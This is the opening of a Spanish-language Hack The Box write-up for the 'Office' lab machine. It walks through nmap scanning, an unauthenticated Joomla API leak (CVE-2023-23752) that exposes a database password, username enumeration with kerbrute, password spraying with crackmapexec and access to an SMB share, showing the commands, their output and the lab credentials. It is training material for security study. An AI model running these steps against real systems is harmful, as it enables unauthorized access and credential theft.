@@ -1,0 +1,1434 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Office (hard) · MiguelRega7</title>
+<meta name="description" content="- Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing Libr"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Office (hard)</h1><div class="meta"><span>◷</span><time>2024-07-19</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">- Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing Libr.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#shell-as-web-account">Shell as web_account</a><a href="#shell-as-tstark">Shell as tstark</a><a href="#shell-as-ppotts">Shell as ppotts</a><a href="#shell-as-hhogan">Shell as hhogan</a><a href="#escalada-de-privilegios">Escalada de Privilegios</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/2cdef06b99725f3dcce38431a95b7b77.png">
+</p>
+
+<ul>
+<li>Office is a hard-difficulty Windows machine featuring various vulnerabilities including Joomla web application abuse, PCAP analysis to identify Kerberos credentials, abusing LibreOffice macros after disabling the <code>MacroSecurityLevel</code> registry value, abusing MSKRP to dump DPAPI credentials and abusing Group Policies due to excessive Active Directory privileges.</li>
+</ul>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Puertos abiertos y servicios que están abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ sudo nmap -sCV -p53,80,88,139,389,443,445,464,593,636,3268,3269,5985,9389,49664,49669,58531,58538,58562 10.10.11.3 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-18 17:50 CST
+Nmap scan report for 10.10.11.3
+Host is up (0.12s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+|_http-title: Home
+| http-robots.txt: 16 disallowed entries (15 shown)
+| /joomla/administrator/ /administrator/ /api/ /bin/
+| /cache/ /cli/ /components/ /includes/ /installation/
+|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+|_http-generator: Joomla! - Open Source Content Management
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-07-19 07:49:54Z)
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+|_ssl-date: 2024-07-19T07:51:27+00:00; +7h59m33s from scanner time.
+443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+| tls-alpn:
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2009-11-10T23:48:47
+|_Not valid after:  2019-11-08T23:48:47
+|_http-title: 403 Forbidden
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+|_ssl-date: 2024-07-19T07:51:28+00:00; +7h59m33s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-07-19T07:51:27+00:00; +7h59m33s from scanner time.
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2024-07-19T07:51:28+00:00; +7h59m33s from scanner time.
+| ssl-cert: Subject: commonName=DC.office.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.office.htb
+| Not valid before: 2023-05-10T12:36:58
+|_Not valid after:  2024-05-09T12:36:58
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+58531/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+58538/tcp open  msrpc         Microsoft Windows RPC
+58562/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h59m32s, deviation: 0s, median: 7h59m32s
+| smb2-time:
+|   date: 2024-07-19T07:50:47
+|_  start_date: N/A
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>Estamos ante un Domain Controller.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cme smb 10.10.11.3
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+</code></pre></div></div>
+<ul>
+<li>Vamos agregar los dominios al <code>/etc/hosts</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ echo &quot;10.10.11.3 office.htb dc.office.htb DC.office.htb&quot; | sudo tee -a /etc/hosts
+10.10.11.3 office.htb dc.office.htb DC.office.htb
+</code></pre></div></div>
+<ul>
+<li><p>Vamos a comenzar enumerando recursos compartidos por el protocolo <strong>SMB</strong>.</p>
+</li>
+<li><p>Si probamos con varias herramientas vemos que no podemos ya que no contamos con credenciales.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cme smb 10.10.11.3 -u &quot;miguelito&quot; -p &quot;&quot; --shares
+SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.3      445    DC               [-] office.htb\miguelito: STATUS_LOGON_FAILURE
+❯ smbmap -H 10.10.11.3 --no-banner
+[*] Detected 1 hosts serving SMB
+[*] Established 0 SMB session(s)
+❯ smbclient -N -L //10.10.11.3
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+<ul>
+<li>Tampoco podemos enumerar por el protocolo <strong>RPC</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rpcclient -N -U &quot;&quot; 10.10.11.3
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+<h2 id="shell-as-web-account">Shell as web_account</h2>
+<ul>
+<li><strong>Nmap</strong> nos reporto que se esta empleando un Joomla como CMS en el puerto <strong>80</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
+|_http-title: Home
+| http-robots.txt: 16 disallowed entries (15 shown)
+| /joomla/administrator/ /administrator/ /api/ /bin/
+| /cache/ /cli/ /components/ /includes/ /installation/
+|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
+|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
+|_http-generator: Joomla! - Open Source Content Management
+</code></pre></div></div>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/1.png">
+</p>
+
+<ul>
+<li>Si examinamos las tecnologías que se están usando no nos reporta la versión del Joomla.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ whatweb http://10.10.11.3
+http://10.10.11.3 [200 OK] Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c114159ac], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[3815f63d17a9109b26eb1b8c114159ac], IP[10.10.11.3], MetaGenerator[Joomla! - Open Source Content Management], OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[password], PoweredBy[the], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.28]
+</code></pre></div></div>
+<ul>
+<li><p>Existe una herramienta la cual nos permite enumerar el Joomla de manera mas rápida <a href="https://www.kali.org/tools/joomscan/">https://www.kali.org/tools/joomscan/</a>.</p>
+</li>
+<li><p>Ahora ya tenemos la versión.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ joomscan -u http://10.10.11.3
+
+    ____  _____  _____  __  __  ___   ___    __    _  _
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+			(1337.today)
+
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://10.10.11.3 ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 4.2.7
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing :
+http://10.10.11.3/administrator/components
+http://10.10.11.3/administrator/modules
+http://10.10.11.3/administrator/templates
+http://10.10.11.3/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://10.10.11.3/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is found
+path : http://10.10.11.3/robots.txt
+
+Interesting path found from robots.txt
+http://10.10.11.3/joomla/administrator/
+http://10.10.11.3/administrator/
+http://10.10.11.3/api/
+http://10.10.11.3/bin/
+http://10.10.11.3/cache/
+http://10.10.11.3/cli/
+http://10.10.11.3/components/
+http://10.10.11.3/includes/
+http://10.10.11.3/installation/
+http://10.10.11.3/language/
+http://10.10.11.3/layouts/
+http://10.10.11.3/libraries/
+http://10.10.11.3/logs/
+http://10.10.11.3/modules/
+http://10.10.11.3/plugins/
+http://10.10.11.3/tmp/
+
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+
+Your Report : reports/10.10.11.3/
+</code></pre></div></div>
+<ul>
+<li><p>El CMS Joomla es Open Source y puedes ver los archivos de configuración en su GitHub <a href="https://github.com/joomla/joomla-cms">https://github.com/joomla/joomla-cms</a>.</p>
+</li>
+<li><p>Si buscamos por vulnerabilidades encontramos el CVE-2023-23752 <a href="https://github.com/Acceis/exploit-CVE-2023-23752">https://github.com/Acceis/exploit-CVE-2023-23752</a> es un Unauthorized Access to webservice endpoints que nos permite ver información importante, aquí nos comparten la ruta donde se aplica <a href="https://www.exploit-db.com/exploits/51334">https://www.exploit-db.com/exploits/51334</a>.</p>
+</li>
+<li><p>Vemos una contraseña.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ curl -s 'http://office.htb/api/index.php/v1/config/application?public=true' | jq .
+{
+  &quot;links&quot;: {
+    &quot;self&quot;: &quot;http://office.htb/api/index.php/v1/config/application?public=true&quot;,
+    &quot;next&quot;: &quot;http://office.htb/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=20&amp;page%5Blimit%5D=20&quot;,
+    &quot;last&quot;: &quot;http://office.htb/api/index.php/v1/config/application?public=true&amp;page%5Boffset%5D=60&amp;page%5Blimit%5D=20&quot;
+  },
+  &quot;data&quot;: [
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;offline&quot;: false,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;offline_message&quot;: &quot;This site is down for maintenance.&lt;br&gt;Please check back again soon.&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;display_offline_message&quot;: 1,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;offline_image&quot;: &quot;&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;sitename&quot;: &quot;Holography Industries&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;editor&quot;: &quot;tinymce&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;captcha&quot;: &quot;0&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;list_limit&quot;: 20,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;access&quot;: 1,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;debug&quot;: false,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;debug_lang&quot;: false,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;debug_lang_const&quot;: true,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;dbtype&quot;: &quot;mysqli&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;host&quot;: &quot;localhost&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;user&quot;: &quot;root&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;password&quot;: &quot;H0lOgrams4reTakIng0Ver754!&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;db&quot;: &quot;joomla_db&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;dbprefix&quot;: &quot;if2tx_&quot;,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;dbencryption&quot;: 0,
+        &quot;id&quot;: 224
+      }
+    },
+    {
+      &quot;type&quot;: &quot;application&quot;,
+      &quot;id&quot;: &quot;224&quot;,
+      &quot;attributes&quot;: {
+        &quot;dbsslverifyservercert&quot;: false,
+        &quot;id&quot;: 224
+      }
+    }
+  ],
+  &quot;meta&quot;: {
+    &quot;total-pages&quot;: 4
+  }
+}
+</code></pre></div></div>
+<ul>
+<li><p>La contraseña es de la base de datos <code>H0lOgrams4reTakIng0Ver754!</code> pero podemos probarla en el panel de login del Joomla aun así.</p>
+</li>
+<li><p>Si recordamos hay un usuario que se llama Tony Stark.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/2.png">
+</p>
+
+<ul>
+<li>No funcionan.</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/hard/office/3.png">
+</p>
+
+<ul>
+<li>Bueno tenemos una contraseña pero no usuarios lo que podemos hacer es enumerar usuarios del dominio con kerbrute <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ /opt/kerbrute_linux_amd64 userenum -d office.htb --dc dc.office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+Version: v1.0.3 (9dad6e1) - 07/18/24 - Ronnie Flathers @ropnop
+
+2024/07/18 18:20:37 &gt;  Using KDC(s):
+2024/07/18 18:20:37 &gt;  	dc.office.htb:88
+
+2024/07/18 18:20:59 &gt;  [+] VALID USERNAME:	 administrator@office.htb
+2024/07/18 18:23:13 &gt;  [+] VALID USERNAME:	 Administrator@office.htb
+2024/07/18 18:24:20 &gt;  [+] VALID USERNAME:	 etower@office.htb
+2024/07/18 18:24:20 &gt;  [+] VALID USERNAME:	 ewhite@office.htb
+2024/07/18 18:24:20 &gt;  [+] VALID USERNAME:	 dwolfe@office.htb
+2024/07/18 18:24:21 &gt;  [+] VALID USERNAME:	 dlanor@office.htb
+2024/07/18 18:24:21 &gt;  [+] VALID USERNAME:	 dmichael@office.htb
+</code></pre></div></div>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat users.txt
+administrator
+ewhite
+etower
+dwolfe
+dlanor
+dmichael
+</code></pre></div></div>
+<ul>
+<li><p>Tenemos usuarios así que ahora podemos usar crackmapexec para ver si algún usuario usa la contraseña.</p>
+</li>
+<li><p>Y bueno el usuario dwolfe usa la contraseña.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cme smb office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
+SMB         office.htb      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         office.htb      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
+SMB         office.htb      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+SMB         office.htb      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
+</code></pre></div></div>
+<ul>
+<li>Como tenemos credenciales ahora si podemos enumerar por el protocolo <code>SMB</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cme smb office.htb -u 'dwolfe' -p 'H0lOgrams4reTakIng0Ver754!' --shares
+SMB         office.htb      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         office.htb      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754!
+SMB         office.htb      445    DC               [+] Enumerated shares
+SMB         office.htb      445    DC               Share           Permissions     Remark
+SMB         office.htb      445    DC               -----           -----------     ------
+SMB         office.htb      445    DC               ADMIN$                          Remote Admin
+SMB         office.htb      445    DC               C$                              Default share
+SMB         office.htb      445    DC               IPC$            READ            Remote IPC
+SMB         office.htb      445    DC               NETLOGON        READ            Logon server share
+SMB         office.htb      445    DC               SOC Analysis    READ
+SMB         office.htb      445    DC               SYSVOL          READ            Logon server share
+</code></pre></div></div>
+<ul>
+<li><p>Hay un recurso interesante que se llama <code>SOC Analysis</code> vamos a conectarnos para examinar.</p>
+</li>
+<li><p>Y bueno vemos un <code>.pcap</code> vamos a descargarlo para ver que contiene.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ impacket-smbclient 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!@office.htb'
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+SOC Analysis
+SYSVOL
+# use SOC Analysis
+# ls
+drw-rw-rw-          0  Wed May 10 12:52:24 2023 .
